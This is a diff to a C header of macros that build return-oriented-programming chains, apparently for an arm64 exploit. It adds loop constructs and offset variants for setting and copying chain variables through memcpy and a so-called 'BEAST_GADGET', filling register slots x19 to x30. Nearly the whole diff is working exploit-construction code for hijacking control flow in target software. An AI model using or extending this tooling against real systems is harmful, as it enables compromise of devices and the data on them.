@@ -10,7 +10,10 @@ enum ropgadget_types {
 	OFFSET,
 	NONE,
 	BUF,
-	ROP_VAR
+	ROP_VAR,
+	ROP_LOOP_START,
+	ROP_LOOP_END,
+	ROP_LOOP_BREAK
 };
 
 struct rop_gadget {
@@ -37,6 +40,7 @@ typedef struct rop_var rop_var_t;
 	if (curr_gadget == NULL) {printf("malloc w00t\n");exit(-1);} \
 	curr_gadget->next = NULL; \
 	curr_gadget->type = NONE; \
+	curr_gadget->comment = NULL; \
 	(offsets)->stage1_ropchain = curr_gadget; \
 	int ropchain_len = 0; 
 
@@ -55,6 +59,21 @@ typedef struct rop_var rop_var_t;
 
 #define ADD_COMMENT(mycomment) \
 	curr_gadget->comment = strdup(mycomment);
+
+#define ADD_LOOP_START(name) \
+	ADD_GADGET(); \
+	curr_gadget->value = (uint64_t) strdup(name); \
+	curr_gadget->type = ROP_LOOP_START; \
+	DEFINE_ROP_VAR(name,8,&curr_gadget); /* using curr_gadget here is dirty... but it works */
+
+#define ADD_LOOP_END() \
+	ADD_GADGET(); \
+	curr_gadget->type = ROP_LOOP_END;
+
+#define ADD_LOOP_BREAK(name) \
+	ADD_GADGET(); \
+	curr_gadget->value = strdup(name); \
+	curr_gadget->type = ROP_LOOP_BREAK;
 
 #define ADD_CODE_GADGET(addr) \
 	ADD_GADGET(); \
@@ -79,7 +98,7 @@ typedef struct rop_var rop_var_t;
 
 #define ADD_ROP_VAR_GADGET_W_OFFSET(name,offset) \
 	ADD_GADGET(); \
-	curr_gadget->value = (uint64_t) name; \
+	curr_gadget->value = (uint64_t) strdup(name); \
 	curr_gadget->second_val = offset; \
 	curr_gadget->type = ROP_VAR; 
 
@@ -142,6 +161,7 @@ longjmp:
 	if (curr_gadget == NULL) {printf("malloc w00t\n");exit(-1);} \
 	curr_gadget->next = NULL; \
 	curr_gadget->type = NONE; \
+	curr_gadget->comment = NULL; \
 	(offsets)->stage3_ropchain = curr_gadget; \
 	rop_var_t * curr_rop_var = NULL; \
 	rop_var_t * new_rop_var = malloc(sizeof(rop_var_t)); \
@@ -226,18 +246,18 @@ longjmp:
 	} \
 	new_rop_var->name = strdup(varname); \
 	new_rop_var->size = varsize; \
-	new_rop_var->buffer = buf;\
+	new_rop_var->buffer = (void*)buf;\
 	new_rop_var->next = NULL; \
 	curr_rop_var = new_rop_var; 
 
-#define SET_ROP_VAR64(name,value) \
+#define SET_ROP_VAR64_W_OFFSET(name,value,offset) \
 	ADD_GADGET(); \
 	ADD_GADGET(); \
 	ADD_GADGET(); /* d9 */ \
 	ADD_GADGET(); /* d8 */ \
 	ADD_GADGET(); /* x28 */ \
 	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
-	ADD_ROP_VAR_GADGET(name); /* x26 */ \
+	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset); /* x26 */ \
 	ADD_REL_OFFSET_GADGET(16); /* x25 */ \
 	ADD_STATIC_GADGET(8); /* x24 */ \
 	ADD_STATIC_GADGET(value); /* x23 (the offset is pointing here) */ \
@@ -248,15 +268,35 @@ longjmp:
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
 
-#define ROP_VAR_CPY(name,other_name,size) \
+#define SET_ROP_VAR64(name,value) SET_ROP_VAR64_W_OFFSET(name,value,0)
+
+#define SET_ROP_VAR64_TO_VAR_W_OFFSET(name,offset1,other_name,offset2) \
 	ADD_GADGET(); \
 	ADD_GADGET(); \
 	ADD_GADGET(); /* d9 */ \
 	ADD_GADGET(); /* d8 */ \
 	ADD_GADGET(); /* x28 */ \
 	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
-	ADD_ROP_VAR_GADGET(name); /* x26 */ \
-	ADD_ROP_VAR_GADGET(other_name); /* x25 */ \
+	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset1); /* x26 */ \
+	ADD_REL_OFFSET_GADGET(16); /* x25 */ \
+	ADD_STATIC_GADGET(8); /* x24 */ \
+	ADD_ROP_VAR_GADGET_W_OFFSET(other_name,offset2); /* x23 (the offset is pointing here) */ \
+	ADD_GADGET(); /* x22 */ \
+	ADD_GADGET(); /* x21 */ \
+	ADD_GADGET(); /* x20 */ \
+	ADD_GADGET(); /* x19 */ \
+	ADD_GADGET(); /* x29 */ \
+	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
+
+#define ROP_VAR_CPY_W_OFFSET(name,offset1,other_name,offset2,size) \
+	ADD_GADGET(); \
+	ADD_GADGET(); \
+	ADD_GADGET(); /* d9 */ \
+	ADD_GADGET(); /* d8 */ \
+	ADD_GADGET(); /* x28 */ \
+	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
+	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset1); /* x26 */ \
+	ADD_ROP_VAR_GADGET_W_OFFSET(other_name,offset2); /* x25 */ \
 	ADD_STATIC_GADGET(size); /* x24 */ \
 	ADD_GADGET(); /* x23 */ \
 	ADD_GADGET(); /* x22 */ \
@@ -265,6 +305,8 @@ longjmp:
 	ADD_GADGET(); /* x19 */ \
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
+
+#define ROP_VAR_CPY(name,other_name,size) ROP_VAR_CPY_W_OFFSET(name,0,other_name,0,size)
 
 #define CALL_FUNC_RET_SAVE_VAR(name,addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
 	CALL_FUNC(addr,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8); \
@@ -295,7 +337,7 @@ longjmp:
 // but the 7th arg is acc at the 6th position and vice versa so we have to account for that
 // this is super dirty...
 // FIXME: there must be a better way to do this...
-#define ROP_VAR_ARG(name,nr) \
+#define ROP_VAR_ARG_W_OFFSET(name,nr,offset) \
 	rop_var_tmp_nr = nr; \
 	if (rop_var_tmp_nr == 6) {rop_var_tmp_nr = 7;} \
 	else if (rop_var_tmp_nr == 7) {rop_var_tmp_nr = 6;} \
@@ -308,13 +350,15 @@ longjmp:
 	ADD_REL_OFFSET_GADGET((8*8+7*8+rop_var_tmp_nr*8)); /* x26 */ \
 	ADD_REL_OFFSET_GADGET(16); /* x25 */ \
 	ADD_STATIC_GADGET(8); /* x24 */ \
-	ADD_ROP_VAR_GADGET(name); /* x23 (the offset is pointing here) */ \
+	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset); /* x23 (the offset is pointing here) */ \
 	ADD_GADGET(); /* x22 */ \
 	ADD_GADGET(); /* x21 */ \
 	ADD_GADGET(); /* x20 */ \
 	ADD_GADGET(); /* x19 */ \
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
+
+#define ROP_VAR_ARG(name,nr) ROP_VAR_ARG_W_OFFSET(name,nr,0)
 
 // same as above but it doesn't copy the pointer but a uint64_t value
 #define ROP_VAR_ARG64(name,nr) \
